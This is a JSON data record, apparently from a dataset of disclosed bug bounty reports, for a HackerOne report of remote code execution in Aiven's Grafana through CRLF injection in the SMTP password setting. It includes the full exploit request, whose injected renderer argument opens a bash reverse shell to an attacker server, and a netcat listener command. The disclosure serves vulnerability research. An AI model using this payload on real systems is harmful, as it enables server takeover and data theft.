@@ -1,0 +1,46 @@
+{
+    "reported_to": "Aiven Ltd",
+    "reported_by": "jarij ",
+    "title": "Grafana RCE via SMTP server parameter injection",
+    "content": "\nSummary:\nThis report is similar to #1180653, except with different parameter injection entrypoint.\nSMTP server password configuration setting accepts new line characters. This can be used to set non-exported configuration variables. Using this CRLF-injection, the rendering_args of grafana image renderer can be modified which leads to code execution on the Grafana server.\nSteps To Reproduce:\n1.Create Aiven Grafana instance\n2.Setup netcat listener on your server: nc -n -lvp 4444\n3.Send the following request to the grafana instance, replace place holders. The aivenv1 token can be retrieved by inspecting the browser traffic.\n4. Browse to https://INSTANCE_SUBDOMAIN.aivencloud.com/render/x to trigger the exploit.\nCode 642 Bytes\n1PUT /v1/project/PROJECT_NAME/service/GRAFANA_INSTANCE_NAME HTTP/1.1\n2Host: console.aiven.io\n3Connection: keep-alive\n4Accept: application/json\n5Authorization: aivenv1 AIVEN_TOKEN_HERE\n6X-Aiven-Client-Version: aiven-console/3.5.1-1104.g2809991854\n7Content-Type: application/json\n8Origin: https://console.aiven.io\n9\n10{\n11    \"user_config\": {\n12        \"smtp_server\": {\n13            \"host\": \"example.org\",\n14            \"port\": 1,\n15            \"from_address\": \"x@examle.org\",\n16            \"password\": \"x\\r\\n[plugin.grafana-image-renderer]\\r\\nrendering_args=--renderer-cmd-prefix=bash -c bash$IFS-l$IFS>$IFS/dev/tcp/SERVER_IP/4444$IFS0<&1$IFS2>&1\"\n17        }\n18    }\n19}\nImpact\nCommand execution on the grafana server. Access and modify data on the grafana server and possibly the attacker could pivot into other servers on the aiven network.\n\n",
+    "severity": [
+        9.0,
+        10.0
+    ],
+    "bounty": 5000,
+    "weaknesses": [
+        "CRLF Injection"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1667906940,
+    "report_url": "https://hackerone.com/reports/1200647",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Create Aiven Grafana instance"
+        ],
+        [
+            2,
+            "Setup netcat listener on your server: nc -n -lvp 4444"
+        ],
+        [
+            3,
+            "Send the following request to the grafana instance, replace place holders. The aivenv1 token can be retrieved by inspecting the browser traffic."
+        ],
+        [
+            4,
+            "Browse to https://INSTANCE_SUBDOMAIN.aivencloud.com/render/x to trigger the exploit."
+        ]
+    ],
+    "vuln_description": "This vulnerability involves a CRLF injection in the SMTP server password configuration setting of Grafana, which allows setting non-exported configuration variables. By injecting new line characters, the rendering_args of the Grafana image renderer can be modified, leading to remote code execution on the Grafana server.",
+    "reason": "The attack requires understanding of CRLF injection, knowledge of Grafana's internal configuration variables, and the ability to chain these with the image renderer's command execution capabilities. The interaction between SMTP configuration and image renderer settings is non-obvious and requires precise manipulation of the application state.",
+    "new_complexity": "HIGH",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": "1180653"
+}
